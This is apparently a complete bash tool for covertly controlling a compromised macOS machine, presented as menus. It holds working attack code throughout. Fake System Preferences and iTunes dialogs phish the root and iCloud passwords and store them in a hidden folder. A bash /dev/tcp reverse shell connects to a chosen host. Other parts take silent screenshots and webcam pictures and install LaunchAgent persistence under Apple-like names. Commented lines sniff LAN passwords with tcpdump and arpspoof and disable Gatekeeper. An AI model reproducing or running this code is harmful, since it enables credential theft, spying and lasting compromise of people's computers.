#!/bin/bash
#By Shellbear
cd /
mkdir -p /Users/$(whoami)/Library/containers/.osxcontrol 
mkdir -p /Users/$(whoami)/Library/containers/.osxcontrol/scripts 
mkdir -p /Users/$(whoami)/Library/containers/.osxcontrol/screenshots
mkdir -p /Users/$(whoami)/Library/containers/.osxcontrol/pictures
mkdir -p /Users/$(whoami)/Library/containers/.osxcontrol/downloads

#sudo spctl --master-disable  - Open apps from everywhere
#sudo softwareupdate --schedule off - Disable software update check
#defaults write com.apple.screensaver askForPassword -int 0 - Disbale password asking after sleeping


#Password sniffing (http) on lan
#sudo tcpdump port http or port ftp or port smtp or port imap or port pop3 -l -A | egrep -i 'pass=|pwd=|log=|login=|user=|username=|pw=|passw=|passwd=|password=|pass:|user:|username:|password:|login:|pass |user ' --color=auto --line-buffered -B20 >> /Users/$(whoami)/Library/containers/.osxcontrol/passwordsniffing.txt
#sudo arpspoof -i en1 192.168.1.1
#https://github.com/chrismcmorran/dSniff-Pre-Compiled-MacOS


function player
{
until
clear
echo 
echo "              ____            ______            __             __"
echo "             / __ \______  __/ ____/___  ____  / /__________  / /"
echo "            / / / / ___| |/_/ /   / __ \/ __ \/ __/ ___/ __ \/ / "
echo "           / /_/ (__  _>  </ /___/ /_/ / / / / /_/ /  / /_/ / /  "
echo "           \____/____/_/|_|\____/\____/_/ /_/\__/_/   \____/_/   "
number=$(ps aux | grep iTunes.app | wc -l)
if [ $number -gt 2 ]
then
state=`osascript -e 'tell application "iTunes" to player state as string'`
if [ $state = "playing" ]; then
artist=`osascript -e 'tell application "iTunes" to artist of current track as string'`
track=`osascript -e 'tell application "iTunes" to name of current track as string'`
echo "Current track $artist - $track"
fi
fi
echo 
echo 
echo "  1) Change System Volume"
echo "  2) Set iTunes Volume"
echo "  3) Play iTunes Music"
echo "  4) Pause iTunes Music"
echo "  5) Play Next Track in iTunes"
echo "  6) Play Previous Track in iTunes"
echo "  7) Stop iTunes Music"
echo "  8) Play mp3 file in Background"
echo "  9) Kill mp3 file playing in background"
echo "  0) Quit"
echo 
echo 
read -n 1 -s -e -p $'\033[0;34m\e[4mOSXC\e[0m > ' CHOICE
 [[ $CHOICE = "0" ]]
do
 case $CHOICE in
 0) main_menu
 ;;
1) volume=`osascript -e 'set ovol to output volume of (get volume settings)'`
echo "Current System volume: $volume/100 "
echo "Volume [0-7]: "
read vol
osascript -e "set Volume $vol"
;;
2) volume=`osascript -e 'tell application "iTunes" to sound volume as integer'`
echo "Current iTunes volume: $volume "
echo "Choose iTunes volume:"
read newvol
osascript -e "tell application \"iTunes\" to set sound volume to $newvol"
;;
3) osascript -e 'tell application "Itunes" to play'
;;
4) osascript -e 'tell application "Itunes" to playpause'
;; 
5) osascript -e 'tell application "Itunes" to next track'
;;
6) osascript -e 'tell application "Itunes" to previous track'
;;
7) osascript -e 'tell application "Itunes" to stop'
;;
8) echo "Path to audio file: "
read audio_file
afplay $audio_file &
;;
9) killall afplay
;;
esac
done
}

function installe
{
until
clear
echo 
echo "              ____            ______            __             __"
echo "             / __ \______  __/ ____/___  ____  / /__________  / /"
echo "            / / / / ___| |/_/ /   / __ \/ __ \/ __/ ___/ __ \/ / "
echo "           / /_/ (__  _>  </ /___/ /_/ / / / / /_/ /  / /_/ / /  "
echo "           \____/____/_/|_|\____/\____/_/ /_/\__/_/   \____/_/   "
echo 
echo 
echo "  1) Install Imagesnap"
echo "  2) Installer Dropbox uploader"
echo "  3) Download File"
echo "  0) Quit"
echo 
echo 
read -n 1 -s -e -p $'\033[0;34m\e[4mOSXC\e[0m > ' CHOICE
 [[ $CHOICE = "0" ]]
do
 case $CHOICE in
 0) main_menu
 ;;
 1) read -p "Directory to install: " Directory
if [ -d "$Directory" ]; then echo
else 
	mkdir /users/$(whoami)/$Directory/
fi
	curl -L http://prdownloads.sourceforge.net/iharder/ImageSnap-v0.2.5.tgz > /users/$(whoami)/$Directory/imagesnap.tgz > /dev/null 2>&1
	tar -zxvf /users/$(whoami)/$Directory/imagesnap.tgz > /dev/null 2>&1
	cp ImageSnap-v0.2.5/imagesnap /users/$(whoami)/$Directory/ > /dev/null 2>&1
	rm /users/$(whoami)/$Directory/imagesnap.tgz > /dev/null 2>&1
	rm -R ImageSnap-v0.2.5 > /dev/null 2>&1
echo "Successfuly installed ImageSnap at /users/$(whoami)/$Directory/"
read "Press enter to continue"
;;	
2) read -p "Directory to install: " Directory
if [ -d "$Directory" ]; then echo
else 
	mkdir /users/$(whoami)/$Directory/
fi
curl -L https://github.com/andreafabrizi/Dropbox-Uploader/archive/master.zip > /users/$(whoami)/$Directory/uploader.tgz > /dev/null 2>&1
tar -zxvf /users/$(whoami)/$Directory/uploader.tgz > /dev/null 2>&1
cp Dropbox-Uploader-master/dropbox_uploader.sh /users/$(whoami)/$Directory/uploader.tgz > /dev/null 2>&1
rm /users/$(whoami)/$Directory/uploader.tgz > /dev/null 2>&1
rm -R Dropbox-Uploader-master > /dev/null 2>&1
rm 
echo "Successfuly installed Dropbox-Uploader at /users/$(whoami)/$Directory/"
read "Press enter to continue"
;;
3) read -p "URL: " url
curl -s -L $url > /Users/$(whoami)/Library/containers/.osxcontrol/downloads/$(basename $url)
echo "Downloaded file at : "
echo "/Users/$(whoami)/Library/containers/.osxcontrol/downloads/$(basename $url)"
echo
echo "Press enter to continue"
read
;;
esac
done
}


function Connections
{
until
clear
echo 
echo "              ____            ______            __             __"
echo "             / __ \______  __/ ____/___  ____  / /__________  / /"
echo "            / / / / ___| |/_/ /   / __ \/ __ \/ __/ ___/ __ \/ / "
echo "           / /_/ (__  _>  </ /___/ /_/ / / / / /_/ /  / /_/ / /  "
echo "           \____/____/_/|_|\____/\____/_/ /_/\__/_/   \____/_/   "
echo 
echo 
echo "  1) TCP Connection"
echo "  0) Quit"
echo 
echo 
read -n 1 -s -e -p $'\033[0;34m\e[4mOSXC\e[0m > ' CHOICE
 [[ $CHOICE = "0" ]]
do
 case $CHOICE in
 0) main_menu
 ;;
 1) read -p "IP to connect: " ip
read -p "Port to connect: " port
bash &> /dev/tcp/$ip/$port 0>&1
;;		
esac
done
}






function open_
{
until
clear
echo 
echo "              ____            ______            __             __"
echo "             / __ \______  __/ ____/___  ____  / /__________  / /"
echo "            / / / / ___| |/_/ /   / __ \/ __ \/ __/ ___/ __ \/ / "
echo "           / /_/ (__  _>  </ /___/ /_/ / / / / /_/ /  / /_/ / /  "
echo "           \____/____/_/|_|\____/\____/_/ /_/\__/_/   \____/_/   "
echo 
echo 
echo "  1) Get list of running applications"
echo "  2) Get list of all running processes"
echo "  3) Open Url"
echo "  4) Open Application"
echo "  5) Open File"
echo "  6) Kill Application"
echo "  7) Kill Process"
echo "  8) List all applications"
echo "  0) Quit"
echo 
echo 
read -n 1 -s -e -p $'\033[0;34m\e[4mOSXC\e[0m > ' CHOICE
 [[ $CHOICE = "0" ]]
do
 case $CHOICE in
 0) main_menu
 ;;
1) osascript -e 'tell application "System Events" to get name of (processes where background only is false)'
echo
echo "Press enter to continue"
read
;;
2) osascript -e 'tell application "System Events" to get name of (processes where background only is true)'
echo
echo "Press enter to continue"
read
;;
3) echo "Url to open: "
read url
open "$url"
;;
4) echo "Application name: "
read application
open -a "$application"
;;
5) echo "Path of file: "
read file
open "$file"
;;
6) echo 'Running Applications : '
osascript -e 'tell application "System Events" to get name of (processes where background only is false)'
echo "Application to kill: "
read appkill
killall "$appkill"
;;
7) echo 'Running Processes : '
osascript -e 'tell application "System Events" to get name of (processes where background only is true)'
read -p "Process to kill: " processkill
killall "$processkill"
;;
8) ls /Applications | sed -e 's/\..*$//'
echo 
echo "Press enter to continue"
read
;;
esac
done
}



function power
{
until
clear
echo 
echo "              ____            ______            __             __"
echo "             / __ \______  __/ ____/___  ____  / /__________  / /"
echo "            / / / / ___| |/_/ /   / __ \/ __ \/ __/ ___/ __ \/ / "
echo "           / /_/ (__  _>  </ /___/ /_/ / / / / /_/ /  / /_/ / /  "
echo "           \____/____/_/|_|\____/\____/_/ /_/\__/_/   \____/_/   "
echo 
echo 
echo "  1) Shutdown"
echo "  2) Restart"
echo "  3) Sleep"
echo "  0) Quit"
echo 
echo 
read -n 1 -s -e -p $'\033[0;34m\e[4mOSXC\e[0m > ' CHOICE
 [[ $CHOICE = "0" ]]
do
 case $CHOICE in
 0) main_menu
 ;;
 1) osascript -e 'tell app "System Events" to shut down'
;;
2) osascript -e 'tell app "System Events" to restart'
;;
3) osascript -e 'tell app "System Events" to sleep'
;;
esac
done
}


function Root
{
until
clear
echo 
echo "              ____            ______            __             __"
echo "             / __ \______  __/ ____/___  ____  / /__________  / /"
echo "            / / / / ___| |/_/ /   / __ \/ __ \/ __/ ___/ __ \/ / "
echo "           / /_/ (__  _>  </ /___/ /_/ / / / / /_/ /  / /_/ / /  "
echo "           \____/____/_/|_|\____/\____/_/ /_/\__/_/   \____/_/   "
echo 
echo 
echo "  1) Prompt Root Password"
echo "  2) Prompt iCloud Password"
echo "  3) Execute Command as Root"
echo "  4) Add Rule to Host file"
echo "  0) Quit"
echo 
echo 
read -n 1 -s -e -p $'\033[0;34m\e[4mOSXC\e[0m > ' CHOICE
 [[ $CHOICE = "0" ]]
do
 case $CHOICE in
 0) main_menu
;;
1) if [ -f /Users/$(whoami)/Library/containers/.osxcontrol/root.txt ]; then
echo
echo "You already have root password : $(cat /Users/$(whoami)/Library/containers/.osxcontrol/root.txt | base64 -D)"
else until [ -d /Library/osxcontrol ]; do password=$(osascript -e 'tell app "System Preferences" to activate' -e 'tell app "System Preferences" to display dialog "System Preferences needs your password to perform the Update." default answer "" with icon 1  with hidden answer with title "Update Error"' -e 'text returned of result'); echo "$password" | sudo -S mkdir /Library/osxcontrol ; done
echo "$password" | base64 > /Users/$(whoami)/Library/containers/.osxcontrol/root.txt
echo "$password" | sudo -S rm -rf /Library/osxcontrol
echo "Password found : $(cat /Users/$(whoami)/Library/containers/.osxcontrol/root.txt | base64 -D)"
fi
echo "Press enter to continue"
read
;;
2) if [ -f /Users/$(whoami)/Library/containers/.osxcontrol/icloud.txt ]; then
echo
echo "You already have iCloud login : $(cat /Users/$(whoami)/Library/containers/.osxcontrol/icloud.txt | base64 -D)"
echo "Press enter to continue" 
read
else
mail=$(defaults read | grep "AccountID = " | egrep -o '[a-z0-9._-]+@[a-z0-9._-]{2,}\.[a-z]{2,4}')
until [ -f /Users/$(whoami)/Library/containers/.osxcontrol/icloud.txt ]; do 
password=$(osascript -e 'tell app "iTunes" to activate' -e 'tell app "iTunes" to display dialog "Error connecting to iTunes. Please verify your password." default answer "" with icon 1  with hidden answer with title "iTunes Connection"' -e 'text returned of result')
correct=$(curl -s --user $mail:$password https://setup.icloud.com/setup/get_account_settings | grep $mail | uniq | sed 's/\<string>//g' | sed 's/\string>//g' | sed 's/\<//g' | sed 's/\///g')
TwoStep=$(curl -s --user $mail:$password https://setup.icloud.com/setup/get_account_settings | grep identity | uniq |  sed 's/\<string>//g' | sed 's/\string>//g' | sed 's/\<//g' | sed 's/\///g' | awk '{print $1;}')
if [[ "$correct" = "$mail" ]]; then
	echo "Found iCloud Account : "
	echo "$mail - $password"
	echo "$mail - $password" | base64 > /Users/$(whoami)/Library/containers/.osxcontrol/icloud.txt
elif [[ "$TwoStep" = "This" ]]
	then echo "Found iCloud Account but Two-Step Login is activated : " 
	echo "$mail - $password"
	echo "$mail - $password" | base64 > /Users/$(whoami)/Library/containers/.osxcontrol/icloud.txt
fi
done 
echo
echo "Press enter to continue" 
read
fi
;;
3) if [ ! -f /Users/$(whoami)/Library/containers/.osxcontrol/root.txt ]; then
echo "Sorry you dont have root password"
echo "Press enter to continue"
read
else
read -p "Command to execute : " command
echo "$(cat /Users/$(whoami)/Library/containers/.osxcontrol/root.txt | base64 -D)" | sudo -S $command
echo
echo "Done ! Press enter to continue"
read
fi
;;
4) if [ ! -f /Users/$(whoami)/Library/containers/.osxcontrol/root.txt ]; then
echo "Sorry you dont have root password"
echo "Press enter to continue"
read
else
read -p "URL from : " from_url
read -p "To URL : " to_url
IP=$(nslookup $from_url | tail -2 | awk -F ":" '{print $2}' | xargs)
echo "$(cat /Users/$(whoami)/Library/containers/.osxcontrol/root.txt | base64 -D)" | sudo -S echo "$IP $to_url" >> /etc/host
exit 0
echo "Done changed $from_url to $to_url !"
echo
echo "Done ! Press enter to continue"
read 
fi
;;
esac
done
}



function capture
{
until
clear
echo 
echo "              ____            ______            __             __"
echo "             / __ \______  __/ ____/___  ____  / /__________  / /"
echo "            / / / / ___| |/_/ /   / __ \/ __ \/ __/ ___/ __ \/ / "
echo "           / /_/ (__  _>  </ /___/ /_/ / / / / /_/ /  / /_/ / /  "
echo "           \____/____/_/|_|\____/\____/_/ /_/\__/_/   \____/_/   "
echo 
echo 
echo "  1) Take a Screenshot "
echo "  2) Take a Camera Picture"
echo "  0) Quit"
echo 
echo 
read -n 1 -s -e -p $'\033[0;34m\e[4mOSXC\e[0m > ' CHOICE
 [[ $CHOICE = "0" ]]
do
 case $CHOICE in
 0) main_menu
;;
1) screencapture -x /Users/$(whoami)/Library/containers/.osxcontrol/screenshots/Screenshot_`date +%Y_%m_%d_%H:%M:%S`.jpg
echo "Saved Screenshot at /Users/$(whoami)/Library/containers/.osxcontrol/screenshots/Screenshot_`date +%Y_%m_%d_%H:%M:%S`.jpg"
echo "Press enter to continue"
read 
;;
2) read -p "Imagesnap Directory: " Directory
read -p "Directory to Save: " folder
cd $Directory
./imagesnap /users/$(whoami)/$folder/Snap`date +%Y_%m_%d_%H:%M:%S`.jpg > /dev/null 2>&1
cd
cd
;;
 esac
done
}

function Scripting
{
until
clear
echo 
echo "              ____            ______            __             __"
echo "             / __ \______  __/ ____/___  ____  / /__________  / /"
echo "            / / / / ___| |/_/ /   / __ \/ __ \/ __/ ___/ __ \/ / "
echo "           / /_/ (__  _>  </ /___/ /_/ / / / / /_/ /  / /_/ / /  "
echo "           \____/____/_/|_|\____/\____/_/ /_/\__/_/   \____/_/   "
echo 
echo 
numb=$(ls -1 /Users/$(whoami)/Library/containers/.osxcontrol/scripts | while read $line; do grep -RE "/Users/$(whoami)/Library/containers/.osxcontrol/scripts/$line" ~/Library/LaunchAgents | grep -o "[^ ]*.plist" | wc -l | sed 's/\ //g' ; done | uniq )
if [ -n "$numb" ]; then
echo "  There is $numb Boot launching scripts and $(ls /Users/$(whoami)/Library/containers/.osxcontrol/scripts | wc -l | sed 's/\ //g') scripts"
echo
fi
echo "  1) Write script"
echo "  2) Boot Launching a script"
echo "  3) Show Boot Launching scripts"
echo "  4) Delete Boot Launching Script"
echo "  5) Script Manager"
echo "  0) Quit"
echo 
echo 
read -n 1 -s -e -p $'\033[0;34m\e[4mOSXC\e[0m > ' CHOICE
 [[ $CHOICE = "0" ]]
do
 case $CHOICE in
 0) main_menu
 ;;
 1) read -p "Name of the script and extension (ex: script.sh): " script
script=${script:-script.sh}
nano /Users/$(whoami)/Library/containers/.osxcontrol/scripts/$script
echo "Script saved at : /Users/$(whoami)/Library/containers/.osxcontrol/scripts/$script"
echo "Press enter to continue"
read
;;
2) if ls /Users/$(whoami)/Library/containers/.osxcontrol/scripts/* 1> /dev/null 2>&1; then
echo
ls /Users/$(whoami)/Library/containers/.osxcontrol/scripts
echo 
read -p $'\033[0;34m\e[4mScript Name\e[0m > ' boot_launching
while [[ ! "$boot_launching" ]]; do
	read -p "Please choose a script : " boot_launching
done
read -p "Name of LaunchAgent (ex : com.apple.icloud)" launchagent
launchagent=${launchagent:-com.apple.icloud}
while [ -f ~/Library/LaunchAgents/$launchagent.plist ]; do
	read -p "$launchagent Already exist, please provide an other name : " launchagent
done
cat <<EOM >~/Library/LaunchAgents/$launchagent.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>Label</key>
	<string>$launchagent</string>
	<key>Program</key>
	<string>/Users/$(whoami)/Library/containers/.osxcontrol/scripts/$boot_launching</string>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>
EOM
chmod +x /Users/$(whoami)/Library/containers/.osxcontrol/scripts/$boot_launching
launchctl load ~/Library/LaunchAgents/$launchagent.plist
sh /Users/$(whoami)/Library/containers/.osxcontrol/scripts/$boot_launching
echo "Successfuly launched $boot_launching at Boot !"
echo "Press enter to continue"
read
else 
	echo "There is no Script"
	echo "Press enter to continue"
	read
fi
;;
3) if ls /Users/$(whoami)/Library/containers/.osxcontrol/scripts/* 1> /dev/null 2>&1; then
echo
numb=$(ls -1 /Users/$(whoami)/Library/containers/.osxcontrol/scripts | while read $line; do grep -RE "/Users/$(whoami)/Library/containers/.osxcontrol/scripts/$line" ~/Library/LaunchAgents | grep -o "[^ ]*.plist" | wc -l | sed 's/\ //g' ; done | uniq)
echo "There is $numb Boot launching scripts :"
ls -1 /Users/$(whoami)/Library/containers/.osxcontrol/scripts | while read line; do launch=$(grep -RE "/Users/$(whoami)/Library/containers/.osxcontrol/scripts/$line" ~/Library/LaunchAgents | grep -o "[^ ]*.plist"); echo "$line with LaunchAgent : $(basename $launch)";done
echo
echo "Press enter to continue"
read
else 
	echo "There is no Script"
	echo "Press enter to continue"
	read
fi
;;
4) if ls /Users/$(whoami)/Library/containers/.osxcontrol/scripts/* 1> /dev/null 2>&1; then
echo
numb=$(ls -1 /Users/$(whoami)/Library/containers/.osxcontrol/scripts | while read $line; do grep -RE "/Users/$(whoami)/Library/containers/.osxcontrol/scripts/$line" ~/Library/LaunchAgents | grep -o "[^ ]*.plist" | wc -l | sed 's/\ //g' ; done | uniq)
echo "There is $numb Boot launching scripts :"
ls -1 /Users/$(whoami)/Library/containers/.osxcontrol/scripts | while read line; do launch=$(grep -RE "/Users/$(whoami)/Library/containers/.osxcontrol/scripts/$line" ~/Library/LaunchAgents | grep -o "[^ ]*.plist"); echo "$line with LaunchAgent : $(basename $launch)";done
echo
read -p $'\033[0;34m\e[4mBootLaunching Script\e[0m > ' del_boot_launching
echo "Press enter to continue"
read
else 
	echo "There is no Script"
	echo "Press enter to continue"
	read
fi
;;
5) if ls /Users/$(whoami)/Library/containers/.osxcontrol/scripts/* 1> /dev/null 2>&1; then
echo
echo "Found $(ls /Users/$(whoami)/Library/containers/.osxcontrol/scripts | wc -l | sed 's/\ //g') scripts: "
ls /Users/$(whoami)/Library/containers/.osxcontrol/scripts
echo
read -p $'\033[0;34m\e[4mSCRIPTING\e[0m > ' script_edit
if [[ $(echo $script_edit | awk '{print $1;}') = rm ]]
	then rm /Users/$(whoami)/Library/containers/.osxcontrol/scripts/$(echo $script_edit | awk '{print $2;}')
elif [[ $(echo $script_edit | awk '{print $1;}') = nano ]]
	then nano /Users/$(whoami)/Library/containers/.osxcontrol/scripts/$(echo $script_edit | awk '{print $2;}')
elif [[ $(echo $script_edit | awk '{print $1;}') = exit ]]
	then echo &
elif [[ $(echo $script_edit | awk '{print $1;}') = * ]]
	then echo 'Invalid command ! Try "rm, nano or exit" '
	echo "Press enter to continue"
read
fi
else 
	echo "There is no Script"
	echo "Press enter to continue"
	read
fi
;;
esac
done
}



function informations
{
clear
echo 
echo "              ____            ______            __             __"
echo "             / __ \______  __/ ____/___  ____  / /__________  / /"
echo "            / / / / ___| |/_/ /   / __ \/ __ \/ __/ ___/ __ \/ / "
echo "           / /_/ (__  _>  </ /___/ /_/ / / / / /_/ /  / /_/ / /  "
echo "           \____/____/_/|_|\____/\____/_/ /_/\__/_/   \____/_/   "
echo 
echo 
echo "Device Model : $(curl -s http://support-sp.apple.com/sp/product?cc=`system_profiler SPHardwareDataType | awk '/Serial/ {print $4}' | cut -c 9-` |
    sed 's|.*<configCode>\(.*\)</configCode>.*|\1|') - $(sw_vers | awk -F':\t' '{print $2}' | paste -d ' ' - - -) "
echo "Battery : $(pmset -g batt | grep -o '[^ ]*%' | grep -o '[0-9]*%')"
echo "System Integrity is $(csrutil status | awk 'NF>1{print $NF}' | sed 's/\.//g')"
echo "Internal IP : $(ipconfig getifaddr en1)"
echo "External IP : $(curl -s ipecho.net/plain ; echo)"
echo "Actual User : $(whoami)"
echo "iCloud mail : $(defaults read | grep "AccountID = " | egrep -o '[a-z0-9._-]+@[a-z0-9._-]{2,}\.[a-z]{2,4}')"
echo "iCloud Name : $(defaults read | grep " DisplayName =" |  awk '{print $3, $4}' | sed 's/\"//g' | sed 's/\;//g')"
echo 
echo "Press enter to continue"
read
main_menu
}


function main_menu2
{
until
clear
echo 
echo "              ____            ______            __             __"
echo "             / __ \______  __/ ____/___  ____  / /__________  / /"
echo "            / / / / ___| |/_/ /   / __ \/ __ \/ __/ ___/ __ \/ / "
echo "           / /_/ (__  _>  </ /___/ /_/ / / / / /_/ /  / /_/ / /  "
echo "           \____/____/_/|_|\____/\____/_/ /_/\__/_/   \____/_/   "
echo 
echo $'  \033[0;34mPage 2/2\e[0m  '
echo 
echo "  1) Scripting"
echo "  2) Root"
echo "  9) Fist Page"
echo "  0) Quit"
echo 
echo 
read -n 1 -s -e -p $'\033[0;34m\e[4mOSXC\e[0m > ' CHOICE
 [[ $CHOICE = "0" ]]
do
 case $CHOICE in
 0) exit 1
;;
1) Scripting
;;
2) Root
;;
9) main_menu
;;
esac
done
}


function main_menu 
{
until
clear
echo 
echo "              ____            ______            __             __"
echo "             / __ \______  __/ ____/___  ____  / /__________  / /"
echo "            / / / / ___| |/_/ /   / __ \/ __ \/ __/ ___/ __ \/ / "
echo "           / /_/ (__  _>  </ /___/ /_/ / / / / /_/ /  / /_/ / /  "
echo "           \____/____/_/|_|\____/\____/_/ /_/\__/_/   \____/_/   "
echo 
echo $'  \033[0;34mPage 1/2\e[0m  '
echo 
echo "  1) Player Controls"
echo "  2) Applications Controls"
echo "  3) Informations"
echo "  4) Capture Controls"
echo "  5) Power Controls"
echo "  6) Install Controls"
echo "  7) Shell"
echo "  8) Connections Controls"
echo "  9) Second Page"
echo "  0) Quit"
echo 
echo 
read -n 1 -s -e -p $'\033[0;34m\e[4mOSXC\e[0m > ' CHOICE
 [[ $CHOICE = "0" ]]
do
 case $CHOICE in
 0) exit 1
 ;;
 1) player
;;
2) open_
;;
3) informations
;;
5) power
;;
6) installe
;;
4) capture
;;
7) bash
;;
8) Connections
;;
9) main_menu2 
;;
esac
done
}

main_menu